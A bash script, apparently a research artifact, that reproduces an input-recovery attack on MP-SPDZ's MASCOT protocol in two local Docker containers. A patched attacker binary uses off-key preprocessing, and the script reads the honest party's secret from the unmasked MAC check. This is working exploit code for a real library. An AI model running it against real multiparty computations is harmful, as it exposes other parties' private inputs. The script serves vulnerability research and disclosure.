#!/bin/bash
# Stronger off-key attack against MP-SPDZ MASCOT: FULL INPUT RECOVERY in one run.
#
# This is the Section 4.4 attack. MP-SPDZ's default MAC check is the *unmasked*
# Damgard et al. (2013) check, which commits-and-opens every party's individual
# check share. So the attacker does not merely learn one bit from pass/fail
# (that is run-attack.sh, the selective-failure variant): it reads the honest
# party's secret input y directly off the reconstructed check value, in a single
# run, regardless of whether the protocol then aborts.
#
# No guess is needed. The only tampering is the off-key preprocessing: the
# worker thread's Beaver triple is generated under key alpha+1 while the honest
# input y was authenticated under alpha. The worker opens d = y - b and the
# unmasked check reveals d*(alpha+1) - m_d = y.
#
# The attacker still inputs x = 0, so the opened output is always 0 and reveals
# nothing about y -- yet the attacker recovers y in full.
#
# Container "honest":   clean mpspdz:built image, zero patches, stock binary.
# Container "attacker": same base image, patched at runtime.
#
# Usage: ./run-recovery.sh [secret]
#   Default secret=42. Try any value, e.g. ./run-recovery.sh 12345

set -eo pipefail

SECRET=${1:-42}

echo "=== Off-Key Input-Recovery Attack (unmasked MAC check, Section 4.4) ==="
echo "Honest party's secret y: $SECRET   (attacker inputs x=0; output is always 0)"
echo ""

cd "$(dirname "$0")"

NETWORK=recover-net
PORT=15000

cleanup() {
  docker rm -f attacker honest 2>/dev/null || true
  docker network rm $NETWORK 2>/dev/null || true
}
trap cleanup EXIT
cleanup

docker network create $NETWORK >/dev/null

echo "--- Step 1: Start containers (same clean base image) ---"
docker run -d --name attacker --network $NETWORK mpspdz:built sleep infinity >/dev/null
docker run -d --name honest   --network $NETWORK mpspdz:built sleep infinity >/dev/null
echo "  attacker + honest on network '$NETWORK'"

echo "--- Step 2: Prepare honest party (completely unmodified) ---"
docker cp simple_threaded_mul.mpc honest:/usr/src/MP-SPDZ/Programs/Source/
docker exec honest bash -c "
  cd /usr/src/MP-SPDZ
  ./compile.py simple_threaded_mul 2>&1 | tail -1
  mkdir -p Player-Data
  echo $SECRET > Player-Data/Input-P1-0
"
echo "  honest ready (stock mascot-party.x, no patches)"

echo "--- Step 3: Prepare attacker (patched binary) ---"
docker cp simple_threaded_mul.mpc attacker:/usr/src/MP-SPDZ/Programs/Source/
docker cp patch_guess.py attacker:/usr/src/MP-SPDZ/
docker exec attacker bash -c "
  cd /usr/src/MP-SPDZ
  python3 patch_guess.py
  rm -f Machines/SPDZ.o Machines/mascot-party.o Protocols/*.o
  make -j4 mascot-party.x 2>&1 | tail -1
  ./compile.py simple_threaded_mul 2>&1 | tail -1
  mkdir -p Player-Data
  echo 0 > Player-Data/Input-P0-0
"
echo "  attacker ready (patched mascot-party.x)"

echo ""
echo "--- Step 4: Run protocol once (no guess; off-key only) ---"
# Attacker (party 0): off-key preprocessing on, no guess (recovery mode).
docker exec -d attacker bash -c "
  cd /usr/src/MP-SPDZ
  ATTACK_MAC_KEY=1 \
    ./mascot-party.x 0 simple_threaded_mul -pn $PORT -h attacker -N 2 \
    > /tmp/party0.log 2>&1
"
sleep 1
docker exec honest bash -c "
  cd /usr/src/MP-SPDZ
  ./mascot-party.x 1 simple_threaded_mul -pn $PORT -h attacker -N 2 \
    > /tmp/party1.log 2>&1
" || true
sleep 2

echo "--- Attacker log ---"
docker exec attacker cat /tmp/party0.log 2>/dev/null | sed 's/^/  [attacker] /'

echo ""
# The worker runs its own MAC check on every value it opens. The triple's
# sacrifice check opens internally-consistent values (all recovered as 0). The
# online multiplication opens x-a (reveals x=0) and y-b (reveals y). Since the
# attacker inputs x=0, exactly one recovered value is nonzero, and it is y.
ALL=$(docker exec attacker cat /tmp/party0.log 2>/dev/null \
        | sed -n 's/.*ATTACK_RECOVERED opening=[0-9]* value=\([0-9]*\).*/\1/p')
FOUND=$(printf '%s\n' "$ALL" | grep -v '^0$' | tail -1 || true)
REC=${FOUND:-0}

echo "=== RESULT ==="
if [ -n "$ALL" ]; then
  echo "Attacker recovered the honest party's secret: y = $REC"
  if [ "$REC" = "$SECRET" ]; then
    echo "(matches the true secret $SECRET)"
  else
    echo "(true secret was $SECRET -- mismatch; inspect the attacker log above)"
  fi
else
  echo "No ATTACK_RECOVERED line found; inspect the attacker log above."
fi
echo ""
echo "Note: the opened output x*y is 0 (x=0), revealing nothing; the protocol"
echo "typically aborts on the mismatch, but recovery already happened -- the"
echo "check value is opened before the abort decision."
